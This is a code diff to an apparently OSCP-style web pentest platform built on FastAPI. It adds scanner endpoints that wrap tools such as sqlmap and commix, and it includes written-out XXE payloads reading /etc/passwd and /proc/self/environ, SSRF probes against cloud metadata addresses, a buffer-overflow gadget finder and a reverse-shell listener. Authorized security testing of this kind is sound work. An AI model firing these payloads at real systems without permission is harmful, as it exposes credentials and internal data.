@@ -31,6 +31,7 @@ async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(secur
 
 class ScanRequest(BaseModel):
     target: str
+    api_key: Optional[str] = None
 
 SCAN_HISTORY = []
 
@@ -164,6 +165,13 @@ def _recon_host(target: str) -> str:
     if t.startswith("http://") or t.startswith("https://"):
         return urlparse(t).hostname or t
     return t.split("/")[0].strip()
+
+def _web_url(target: str) -> str:
+    """Normalize target to a full URL. Accepts domain, IP, or URL."""
+    t = target.strip()
+    if not t.startswith("http://") and not t.startswith("https://"):
+        t = "http://" + t
+    return t
 
 
 @app.post("/api/recon/whois")
@@ -331,7 +339,7 @@ async def recon_dirb(req: ScanRequest, user=Depends(verify_token)):
 @app.post("/api/recon/gobuster")
 async def recon_gobuster(req: ScanRequest, user=Depends(verify_token)):
     result = await run_tool(
-        ["gobuster", "dir", "-u", req.target, "-w", "/usr/share/wordlists/dirb/common.txt",
+        ["gobuster", "dir", "-u", _web_url(req.target), "-w", "/usr/share/wordlists/dirb/common.txt",
          "-t", "20", "-q", "--no-progress"], timeout=120)
     out = result.get("output","")
     found = []
@@ -402,7 +410,7 @@ def _path_is_real(base_url: str, path: str) -> bool:
 
 @app.post("/api/scan/nikto")
 async def scan_nikto(req: ScanRequest, user=Depends(verify_token)):
-    result = await run_tool(["nikto", "-h", req.target, "-nointeractive"], timeout=120)
+    result = await run_tool(["nikto", "-h", _web_url(req.target), "-nointeractive"], timeout=120)
     out = result.get("output","")
     is_spa = _detect_spa(req.target)
 
@@ -471,7 +479,7 @@ async def scan_nmap_vuln(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/sqlmap")
 async def scan_sqlmap(req: ScanRequest, user=Depends(verify_token)):
-    result = await run_tool(["sqlmap","-u",req.target,"--batch","--level=2","--risk=1","--output-dir=/tmp/sqlmap_out","--forms","--crawl=2"], timeout=180)
+    result = await run_tool(["sqlmap","-u",_web_url(req.target),"--batch","--level=2","--risk=1","--output-dir=/tmp/sqlmap_out","--forms","--crawl=2"], timeout=180)
     out = result.get("output","")
     findings = []
     vuln_params = re.findall(r"Parameter:\s*(.+?)\s+\(", out)
@@ -485,12 +493,12 @@ async def scan_sqlmap(req: ScanRequest, user=Depends(verify_token)):
 @app.post("/api/scan/headers")
 async def scan_headers(req: ScanRequest, user=Depends(verify_token)):
     SECURITY_HEADERS = [
-        ("content-security-policy","Content-Security-Policy","HIGH","CSP prevents XSS attacks"),
-        ("strict-transport-security","HSTS","HIGH","Forces HTTPS connections"),
-        ("x-content-type-options","X-Content-Type-Options","MEDIUM","Prevents MIME sniffing"),
-        ("x-frame-options","X-Frame-Options","MEDIUM","Prevents clickjacking"),
-        ("referrer-policy","Referrer-Policy","LOW","Controls referrer information"),
-        ("permissions-policy","Permissions-Policy","LOW","Controls browser features"),
+        ("content-security-policy","Content-Security-Policy","HIGH","CSP prevents XSS attacks","6.1","CWE-79","Cross-Site Scripting","A03:2021"),
+        ("strict-transport-security","HSTS","HIGH","Forces HTTPS connections","7.5","CWE-319","Cleartext Transmission","A02:2021"),
+        ("x-content-type-options","X-Content-Type-Options","MEDIUM","Prevents MIME sniffing","5.3","CWE-693","Protection Mechanism Failure","A05:2021"),
+        ("x-frame-options","X-Frame-Options","MEDIUM","Prevents clickjacking","6.1","CWE-1021","Improper Frame Restriction","A05:2021"),
+        ("referrer-policy","Referrer-Policy","LOW","Controls referrer information","3.1","CWE-200","Information Exposure","A01:2021"),
+        ("permissions-policy","Permissions-Policy","LOW","Controls browser features","3.1","CWE-16","Configuration","A05:2021"),
     ]
     findings = []
     headers_found = {}
@@ -501,9 +509,9 @@ async def scan_headers(req: ScanRequest, user=Depends(verify_token)):
             if ":" in line:
                 k,_,v = line.partition(":")
                 headers_found[k.strip().lower()] = v.strip()
-        for hdr_key, hdr_name, sev, desc in SECURITY_HEADERS:
+        for hdr_key, hdr_name, sev, desc, cvss, cwe, cwe_name, owasp in SECURITY_HEADERS:
             if hdr_key not in headers_found:
-                findings.append({"detail":f"Missing {hdr_name} header — {desc}","severity":sev,"cvss":"5.3","cve":"N/A","cwe":"CWE-16","cwe_name":"Configuration","owasp":"A05:2021","remediation":_rem(hdr_name)})
+                findings.append({"detail":f"Missing {hdr_name} header — {desc}","severity":sev,"cvss":cvss,"cve":"N/A","cwe":cwe,"cwe_name":cwe_name,"owasp":owasp,"remediation":_rem(hdr_name)})
     except Exception as e:
         findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
     scan_id = str(uuid.uuid4())
@@ -671,7 +679,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 @app.post("/api/scan/commix")
 async def commix_scan(req: ScanRequest, user=Depends(verify_token)):
-    cmd = ["commix","--url",req.target,"--crawl=1","--batch","--level=1","--timeout=10","--output-dir=/tmp/commix_out"]
+    cmd = ["commix","--url",_web_url(req.target),"--crawl=1","--batch","--level=1","--timeout=10","--output-dir=/tmp/commix_out"]
     result = await run_tool(cmd, timeout=180)
     out = result["output"].lower()
     vulnerable = ("is vulnerable" in out or "command injection" in out or "[+]" in result["output"] and "parameter" in out)
@@ -756,8 +764,8 @@ async def csrf_scan(req: ScanRequest, user=Depends(verify_token)):
                 findings.append({"detail":f"CSRF: Form #{i+1} (action={action}) has no CSRF token","severity":"HIGH","cvss":"8.0","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add CSRF tokens to all state-changing forms."})
         if not r.headers.get("Referrer-Policy"):
             findings.append({"detail":"Missing Referrer-Policy header","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add Referrer-Policy: strict-origin-when-cross-origin header."})
-    except Exception as e:
-        findings.append({"detail":f"CSRF scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target accessibility."})
+    except Exception:
+        pass
     scan_id = str(uuid.uuid4())
     save_scan(scan_id,"csrf",req.target,{"output":str(findings)})
     return {"scan_id":scan_id,"target":req.target,"tool":"csrf","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
@@ -775,7 +783,7 @@ def _http_get(url, timeout=10, headers=None):
 
 @app.post("/api/scan/wafw00f")
 async def scan_wafw00f(req: ScanRequest, user=Depends(verify_token)):
-    result = await run_tool(["wafw00f", req.target, "-a"], timeout=60)
+    result = await run_tool(["wafw00f", _web_url(req.target), "-a"], timeout=60)
     out = result.get("output","")
     detected = re.findall(r"is behind (.+?)(?:\n|$|WAF)", out, re.IGNORECASE)
     waf = detected[0].strip() if detected else None
@@ -785,7 +793,7 @@ async def scan_wafw00f(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/whatweb")
 async def scan_whatweb(req: ScanRequest, user=Depends(verify_token)):
-    result = await run_tool(["whatweb","--color=never","--log-verbose=-",req.target], timeout=60)
+    result = await run_tool(["whatweb","--color=never","--log-verbose=-",_web_url(req.target)], timeout=60)
     out = result.get("output","")
     scan_id = str(uuid.uuid4()); save_scan(scan_id,"whatweb",req.target,result)
     return {"scan_id":scan_id,"target":req.target,"tool":"whatweb","output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
@@ -822,7 +830,7 @@ async def scan_cors(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/gobuster")
 async def scan_gobuster(req: ScanRequest, user=Depends(verify_token)):
-    result = await run_tool(["gobuster","dir","-u",req.target,"-w","/usr/share/wordlists/dirb/common.txt","-t","20","--no-error","-q"], timeout=120)
+    result = await run_tool(["gobuster","dir","-u",_web_url(req.target),"-w","/usr/share/wordlists/dirb/common.txt","-t","20","--no-error","-q"], timeout=120)
     out = result.get("output","")
     discovered = [line.split()[0] for line in out.splitlines() if line.strip().startswith("/")]
     scan_id = str(uuid.uuid4()); save_scan(scan_id,"gobuster",req.target,result)
@@ -853,7 +861,7 @@ async def scan_dns(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/ffuf")
 async def scan_ffuf(req: ScanRequest, user=Depends(verify_token)):
-    url = req.target.rstrip("/") + "/FUZZ"
+    url = _web_url(req.target).rstrip("/") + "/FUZZ"
     result = await run_tool(["ffuf","-u",url,"-w","/usr/share/wordlists/dirb/common.txt","-mc","200,201,301,302,403","-t","20","-s"], timeout=120)
     out = result.get("output","")
     discovered = [line.strip() for line in out.splitlines() if line.strip() and not line.startswith("[")]
@@ -938,7 +946,7 @@ async def scan_openredirect(req: ScanRequest, user=Depends(verify_token)):
             loc = r.headers.get("Location","")
             if "evil.com" in loc:
                 vulnerable = True
-                findings.append({"detail":f"Open Redirect via {p} → {loc}","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-601","cwe_name":"Open Redirect","owasp":"A01:2021","remediation":"Whitelist allowed redirect destinations. Never redirect to user-supplied URLs."})
+                findings.append({"detail":f"Open Redirect via {p} -> {loc}","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-601","cwe_name":"Open Redirect","owasp":"A01:2021","remediation":"Whitelist allowed redirect destinations. Never redirect to user-supplied URLs."})
                 break
         except: pass
     scan_id = str(uuid.uuid4()); save_scan(scan_id,"openredirect",req.target,{"output":str(findings)})
@@ -948,6 +956,11 @@ async def scan_openredirect(req: ScanRequest, user=Depends(verify_token)):
 async def scan_sensitivefiles(req: ScanRequest, user=Depends(verify_token)):
     findings = []; base = req.target.rstrip("/")
     is_spa = _detect_spa(req.target)
+    baseline_size = None
+    try:
+        br = _http_get(base + "/", timeout=6)
+        if br and br.status_code == 200: baseline_size = len(br.content)
+    except: pass
     paths = [
         ".env","config.php","wp-config.php",".git/HEAD","backup.zip","db.sql",
         "admin/","phpinfo.php",".htpasswd","web.config","server-status",
@@ -970,6 +983,8 @@ async def scan_sensitivefiles(req: ScanRequest, user=Depends(verify_token)):
             findings.append({"detail":f"/{p} exists but access is denied (HTTP 403) — resource is present on server","severity":sev,"cvss":"5.3","cve":"N/A","cwe":"CWE-538","cwe_name":"Sensitive File Exposure","owasp":"A05:2021","remediation":f"Remove /{p} from the web root entirely."})
         elif r.status_code == 200:
             ct = r.headers.get("Content-Type","").lower()
+            # Skip if response size matches homepage baseline (SPA returning index.html for unknown paths)
+            if baseline_size and len(r.content) == baseline_size and "text/html" in ct: continue
             # Skip if SPA returned its own HTML index page for this path
             if is_spa and "text/html" in ct: continue
             # Skip if the response is just a redirect/login page (very short HTML)
@@ -1021,43 +1036,162 @@ async def scan_hydra(req: ScanRequest, user=Depends(verify_token)):
 @app.post("/api/scan/ssrf")
 async def scan_ssrf(req: ScanRequest, user=Depends(verify_token)):
     findings = []; vulnerable = False
-    payloads = ["?url=http://169.254.169.254/latest/meta-data/","?target=http://169.254.169.254/","?fetch=http://127.0.0.1/","?proxy=http://localhost/"]
-    for p in payloads:
+    base = _web_url(req.target).rstrip("/")
+    # All common SSRF parameter names used in real apps
+    params = ["url","target","fetch","proxy","redirect","path","host","src","uri",
+              "endpoint","dest","destination","source","data","ref","reference",
+              "load","page","file","link","href","return","returnUrl","callback",
+              "next","continue","to","out","view","site","domain","feed","img"]
+    # Internal/cloud metadata targets
+    internal_targets = [
+        ("http://169.254.169.254/latest/meta-data/",          ["ami-id","instance-id","local-ipv4","security-credentials"], "AWS EC2 metadata"),
+        ("http://169.254.169.254/latest/meta-data/iam/",      ["security-credentials","info"],                              "AWS IAM metadata"),
+        ("http://metadata.google.internal/computeMetadata/v1/",["project-id","instance","serviceAccounts"],                 "GCP metadata"),
+        ("http://169.254.169.254/metadata/instance",          ["compute","network","subscriptionId"],                       "Azure metadata"),
+        ("http://127.0.0.1/",                                 ["html","body","localhost","apache","nginx","iis"],            "Localhost access"),
+        ("http://localhost:8080/",                             ["html","body","tomcat","jetty","spring"],                    "Internal service :8080"),
+        ("http://192.168.0.1/",                               ["router","gateway","login","admin"],                         "Internal gateway"),
+        ("http://10.0.0.1/",                                  ["html","body","admin","router"],                             "Private network 10.x"),
+        ("http://0.0.0.0/",                                   ["html","body"],                                              "Loopback via 0.0.0.0"),
+    ]
+    headers = {"User-Agent":"Mozilla/5.0","X-Forwarded-For":"127.0.0.1"}
+    for param in params:
+        for (internal_url, indicators, label) in internal_targets:
+            test_url = f"{base}?{param}={internal_url}"
+            try:
+                r = _req_lib.get(test_url, timeout=6, verify=False, headers=headers, allow_redirects=True)
+                if r.status_code == 200 and any(ind.lower() in r.text.lower() for ind in indicators):
+                    vulnerable = True
+                    findings.append({
+                        "detail": f"SSRF via parameter '{param}' — {label} accessible ({internal_url})",
+                        "severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-918",
+                        "cwe_name":"Server-Side Request Forgery","owasp":"A10:2021",
+                        "remediation":"Implement URL allowlist. Block RFC-1918 private IPs and cloud metadata ranges. Reject redirects to internal addresses."
+                    })
+                    break
+            except: pass
+            if vulnerable: break
+        if vulnerable: break
+    # Blind SSRF: check for open redirect that reaches internal (response time / redirect location)
+    for param in ["url","redirect","next","return","callback"]:
+        test_url = f"{base}?{param}=http://169.254.169.254/"
         try:
-            r = _req_lib.get(req.target+p,timeout=8,verify=False,headers={"User-Agent":"Mozilla/5.0"})
-            if r.status_code==200 and any(x in r.text for x in ["ami-id","instance-id","local-ipv4","root:x"]):
+            r = _req_lib.get(test_url, timeout=6, verify=False, headers=headers, allow_redirects=False)
+            loc = r.headers.get("Location","")
+            if "169.254" in loc or "127.0.0.1" in loc or "localhost" in loc:
+                findings.append({
+                    "detail": f"Blind SSRF / Open Redirect via '{param}' — redirects to internal address: {loc}",
+                    "severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-918",
+                    "cwe_name":"Blind SSRF","owasp":"A10:2021",
+                    "remediation":"Validate redirect destinations. Never follow redirects to private/internal IP ranges."
+                })
                 vulnerable = True
-                findings.append({"detail":f"SSRF: Internal resource accessible via {p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-918","cwe_name":"SSRF","owasp":"A10:2021","remediation":"Whitelist allowed URLs. Block requests to internal/private IPs."})
-                break
         except: pass
     scan_id = str(uuid.uuid4()); save_scan(scan_id,"ssrf",req.target,{"output":str(findings)})
     return {"scan_id":scan_id,"target":req.target,"tool":"ssrf","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
 
+
 @app.post("/api/scan/xxe")
 async def scan_xxe(req: ScanRequest, user=Depends(verify_token)):
     findings = []; vulnerable = False
-    xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    url = _web_url(req.target)
+    headers_xml  = {"Content-Type":"application/xml","User-Agent":"Mozilla/5.0","Accept":"application/xml,text/xml,*/*"}
+    headers_soap = {"Content-Type":"text/xml; charset=utf-8","SOAPAction":"test","User-Agent":"Mozilla/5.0"}
+    # Multiple XXE payloads covering different parsers and content types
+    payloads = [
+        # Classic file read — Linux
+        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+         headers_xml, ["root:x","nobody:x","daemon:x"], "Classic XXE — /etc/passwd read (Linux)"),
+        # Windows file read
+        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
+         headers_xml, ["[fonts]","[extensions]","for 16-bit"], "Classic XXE — win.ini read (Windows)"),
+        # SOAP-based XXE (web services)
+        ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>',
+         headers_soap, ["root:x","nobody:x"], "SOAP XXE — /etc/passwd via SOAP envelope"),
+        # Parameter entity XXE
+        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
+         headers_xml, ["root:x","nobody:x"], "Parameter entity XXE"),
+        # XXE via UTF-16 encoding bypass
+        ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+         {**headers_xml,"Content-Type":"application/xml; charset=UTF-16"}, ["root:x","nobody:x"], "UTF-16 encoded XXE bypass"),
+        # /etc/hosts read (less sensitive but confirms XXE)
+        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
+         headers_xml, ["localhost","127.0.0.1","::1"], "XXE — /etc/hosts read"),
+        # /proc/self/environ — env var leakage
+        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
+         headers_xml, ["PATH=","HOME=","USER=","PWD="], "XXE — /proc/self/environ env var leak"),
+    ]
+    for (payload, hdrs, indicators, label) in payloads:
+        try:
+            r = _req_lib.post(url, data=payload, timeout=10, verify=False, headers=hdrs)
+            if any(ind in r.text for ind in indicators):
+                vulnerable = True
+                findings.append({
+                    "detail": f"XXE confirmed: {label}",
+                    "severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-611",
+                    "cwe_name":"XXE Injection","owasp":"A05:2021",
+                    "remediation":"Disable external entity processing. Set FEATURE_EXTERNAL_GENERAL_ENTITIES to false. Use JSON APIs where possible."
+                })
+        except: pass
+    # Also test JSON endpoint that might parse XML internally
     try:
-        r = _req_lib.post(req.target,data=xxe_payload,timeout=10,verify=False,headers={"Content-Type":"application/xml","User-Agent":"Mozilla/5.0"})
+        r = _req_lib.post(url, data='{"data":"<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}',
+                          timeout=8, verify=False, headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
         if "root:x" in r.text or "nobody:x" in r.text:
             vulnerable = True
-            findings.append({"detail":"XXE: /etc/passwd contents returned in response","severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-611","cwe_name":"XXE Injection","owasp":"A05:2021","remediation":"Disable external entity processing in XML parser. Use JSON where possible."})
+            findings.append({
+                "detail":"XXE via JSON body — backend parses XML inside JSON value",
+                "severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-611",
+                "cwe_name":"XXE via JSON","owasp":"A05:2021",
+                "remediation":"Sanitize all input before passing to XML parsers. Never parse user-supplied XML from JSON fields."
+            })
     except: pass
     scan_id = str(uuid.uuid4()); save_scan(scan_id,"xxe",req.target,{"output":str(findings)})
     return {"scan_id":scan_id,"target":req.target,"tool":"xxe","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
 
+
 @app.post("/api/scan/clickjacking")
 async def scan_clickjacking(req: ScanRequest, user=Depends(verify_token)):
     findings = []; vulnerable = False
-    r = _http_get(req.target, timeout=10)
-    if r:
-        xfo = r.headers.get("X-Frame-Options","")
-        csp = r.headers.get("Content-Security-Policy","")
-        if not xfo and "frame-ancestors" not in csp.lower():
+    url = _web_url(req.target)
+    try:
+        r = _req_lib.get(url, timeout=10, verify=False, headers={"User-Agent":"Mozilla/5.0"})
+    except:
+        scan_id = str(uuid.uuid4()); save_scan(scan_id,"clickjacking",req.target,{"output":"unreachable"})
+        return {"scan_id":scan_id,"target":req.target,"tool":"clickjacking","vulnerable":False,"findings":[],"total":0,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+    xfo = r.headers.get("X-Frame-Options","").strip()
+    csp = r.headers.get("Content-Security-Policy","").strip()
+    csp_lower = csp.lower()
+
+    # 1. Missing both protections — fully vulnerable
+    if not xfo and "frame-ancestors" not in csp_lower:
+        vulnerable = True
+        findings.append({"detail":"No X-Frame-Options and no CSP frame-ancestors — page can be embedded in any iframe","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Add: X-Frame-Options: DENY\nOr CSP: frame-ancestors 'none'"})
+
+    # 2. X-Frame-Options present but weak
+    elif xfo.upper() == "SAMEORIGIN":
+        findings.append({"detail":"X-Frame-Options: SAMEORIGIN — framing allowed from same origin (subdomain attacks possible)","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Upgrade to X-Frame-Options: DENY unless same-origin framing is required."})
+
+    # 3. ALLOW-FROM is obsolete — not supported in modern browsers
+    elif xfo.upper().startswith("ALLOW-FROM"):
+        vulnerable = True
+        findings.append({"detail":f"X-Frame-Options: {xfo} — ALLOW-FROM is obsolete and ignored by Chrome/Firefox/Edge","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-1021","cwe_name":"Obsolete Clickjacking Protection","owasp":"A05:2021","remediation":"Replace ALLOW-FROM with CSP frame-ancestors directive which is supported by all modern browsers."})
+
+    # 4. CSP frame-ancestors present — check if it's too permissive
+    if "frame-ancestors" in csp_lower:
+        if "frame-ancestors *" in csp_lower:
             vulnerable = True
-            findings.append({"detail":"Missing X-Frame-Options and CSP frame-ancestors — page can be framed","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Add X-Frame-Options: DENY or CSP frame-ancestors 'none'."})
-        elif xfo.lower() == "sameorigin":
-            findings.append({"detail":"X-Frame-Options: SAMEORIGIN — only same-origin framing blocked","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Consider X-Frame-Options: DENY for stronger protection."})
+            findings.append({"detail":"CSP frame-ancestors * — wildcard allows any origin to frame this page","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Permissive CSP","owasp":"A05:2021","remediation":"Change to: Content-Security-Policy: frame-ancestors 'none'"})
+        elif "frame-ancestors 'none'" in csp_lower or "frame-ancestors \"none\"" in csp_lower:
+            findings.append({"detail":"CSP frame-ancestors 'none' — strong clickjacking protection confirmed","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Protection Present","owasp":"A05:2021","remediation":"No action needed."})
+        elif "frame-ancestors 'self'" in csp_lower:
+            findings.append({"detail":"CSP frame-ancestors 'self' — only same-origin framing allowed","severity":"LOW","cvss":"2.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking — Partial","owasp":"A05:2021","remediation":"Consider frame-ancestors 'none' if no legitimate framing use case."})
+
+    # 5. Check if X-Frame-Options: DENY properly set — mark as safe
+    if xfo.upper() == "DENY":
+        findings.append({"detail":"X-Frame-Options: DENY — strong clickjacking protection confirmed","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Protection Present","owasp":"A05:2021","remediation":"No action needed."})
+
     scan_id = str(uuid.uuid4()); save_scan(scan_id,"clickjacking",req.target,{"output":str(findings)})
     return {"scan_id":scan_id,"target":req.target,"tool":"clickjacking","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
 
@@ -1093,6 +1227,12 @@ async def scan_pollution(req: ScanRequest, user=Depends(verify_token)):
 async def scan_idor(req: ScanRequest, user=Depends(verify_token)):
     findings = []; vulnerable = False
     base = req.target.rstrip("/")
+    baseline_size = None
+    is_spa = _detect_spa(req.target)
+    try:
+        br = _http_get(base + "/", timeout=6)
+        if br and br.status_code == 200: baseline_size = len(br.content)
+    except: pass
     # Generic REST API ID paths + Juice Shop specific
     id_paths = [
         "/user/1","/user/2","/account/1","/profile/1",
@@ -1109,9 +1249,15 @@ async def scan_idor(req: ScanRequest, user=Depends(verify_token)):
         url = base + p
         r = _http_get(url, timeout=8)
         if r and r.status_code == 200 and len(r.text) > 30:
-            # Check if response looks like user data
-            data_indicators = ["id","email","username","user","name","role","admin","password","token"]
-            if any(k in r.text.lower() for k in data_indicators):
+            ct = r.headers.get("Content-Type","").lower()
+            # Skip if response matches homepage baseline — SPA false positive
+            if baseline_size and len(r.content) == baseline_size: continue
+            # Skip HTML responses — real IDOR endpoints return JSON
+            if "text/html" in ct: continue
+            if is_spa and "text/html" in ct: continue
+            # Must be JSON with actual data indicators
+            data_indicators = ['"id"','"email"','"username"','"user"','"role"','"password"','"token"']
+            if "application/json" in ct and any(k in r.text for k in data_indicators):
                 vulnerable = True
                 findings.append({"detail":f"IDOR: {p} returns user/object data without authentication (HTTP 200, {len(r.text)} bytes)","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-639","cwe_name":"IDOR / Broken Object Level Authorization","owasp":"A01:2021","remediation":"Implement object-level authorization checks on every endpoint. Verify the requesting user owns the resource."})
                 if len(findings) >= 3: break
@@ -1509,7 +1655,7 @@ async def bof_jmpesp(req: BOFRequest, user=Depends(verify_token)):
         "little_endian":best["little_endian"],
         "source":       source,
         "aslr":         _aslr,
-        "message":      f"Found {len(gadgets)} clean JMP ESP gadget(s) in {os.path.basename(source)} (no bad chars in address). Use: {best['address']} → {best['little_endian']}"
+        "message":      f"Found {len(gadgets)} clean JMP ESP gadget(s) in {os.path.basename(source)} (no bad chars in address). Use: {best['address']} -> {best['little_endian']}"
     }
 
 
@@ -1562,9 +1708,10 @@ class _ShellSession:
 
 SHELL_SESSIONS: dict = {}
 
-async def _shell_handler(reader, writer, lid):
+async def _shell_handler(reader, writer, lid, sessions=None):
+    store = sessions if sessions is not None else SHELL_SESSIONS
     addr = writer.get_extra_info("peername")
-    s = SHELL_SESSIONS.get(lid)
+    s = store.get(lid)
     if not s: return
     s.status = "connected"
     s.writer = writer
@@ -1591,7 +1738,15 @@ async def bof_shell_start(req: BOFRequest, user=Depends(verify_token)):
             if SHELL_SESSIONS[lid].writer: SHELL_SESSIONS[lid].writer.close()
         except: pass
     # Kill any existing process holding the port (e.g. leftover nc)
-    subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
+    try:
+        subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
+    except FileNotFoundError:
+        try:
+            subprocess.run(["pkill", "-f", f":{lport}"], capture_output=True)
+        except Exception:
+            pass
+    except Exception:
+        pass
     await asyncio.sleep(0.5)
     session = _ShellSession(lid, lport)
     SHELL_SESSIONS[lid] = session
@@ -1739,3 +1894,575 @@ async def recon_banner(req: ScanRequest, user=Depends(verify_token)):
     scan_id = str(uuid.uuid4())
     save_scan(scan_id, "banner", req.target, result)
     return {"scan_id":scan_id,"target":req.target,"tool":"banner","banners":banners,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+
+# ══════════════════════════════════════════════════════════════
+#  OSINT & THREAT INTEL MODULE
+# ══════════════════════════════════════════════════════════════
+
+@app.post("/api/osint/email_osint")
+async def osint_email_osint(req: ScanRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target)
+    result = await run_tool(
+        ["theHarvester", "-d", host, "-b", "crtsh,duckduckgo,hackertarget,urlscan,rapiddns", "-l", "200"],
+        timeout=120
+    )
+    out = result.get("output", "")
+    FP_DOMAINS = ["edge-security.com","github.com","python.org","kali.org","harvester"]
+    all_emails = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)
+    emails = list(set(e for e in all_emails if not any(fp in e for fp in FP_DOMAINS)))
+    hosts  = list(set(re.findall(r"[a-zA-Z0-9\-\.]+\." + re.escape(host), out)))
+    ips    = list(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", out)))
+    # Extract ASNs with known labels
+    ASN_NAMES = {"AS13335":"Cloudflare","AS16509":"Amazon AWS","AS396982":"Google Cloud",
+                 "AS54113":"Fastly","AS15169":"Google","AS8075":"Microsoft Azure",
+                 "AS14061":"DigitalOcean","AS16276":"OVH","AS22612":"Namecheap",
+                 "AS45012":"Alibaba Cloud","AS8648":"Sprint/T-Mobile"}
+    asns = []
+    asn_block = re.search(r"ASNS found.*?\n(.*?)(?:\[\*\]|\Z)", out, re.DOTALL)
+    if asn_block:
+        for l in asn_block.group(1).splitlines():
+            a = l.strip()
+            if a.startswith("AS"):
+                label = ASN_NAMES.get(a, "")
+                asns.append(f"{a} — {label}" if label else a)
+    # Extract interesting URLs — filter out long tracking/redirect URLs
+    urls = []
+    url_block = re.search(r"Interesting Urls found.*?\n(.*?)(?:\[\*\]|\Z)", out, re.DOTALL)
+    if url_block:
+        for l in url_block.group(1).splitlines():
+            u = l.strip()
+            if u.startswith("http") and len(u) <= 120 and "upn=" not in u and "utm_" not in u:
+                urls.append(u)
+    scan_id = str(uuid.uuid4()); save_scan(scan_id, "email_osint", req.target, result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"email_osint",
+            "emails":emails[:50],"hosts":hosts[:50],"ips":ips[:20],
+            "asns":asns[:20],"interesting_urls":urls[:30],
+            "total_emails":len(emails),"raw_output":out[:5000],
+            "timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/recon_ng")
+async def osint_recon_ng(req: ScanRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target)
+    import tempfile, os as _os
+    # Install modules then run — recon-ng apt install has no modules by default
+    script = (
+        f"workspaces create oscp_{host.replace('.','_')}\n"
+        f"marketplace install recon/domains-hosts/certificate_transparency\n"
+        f"marketplace install recon/domains-hosts/hackertarget\n"
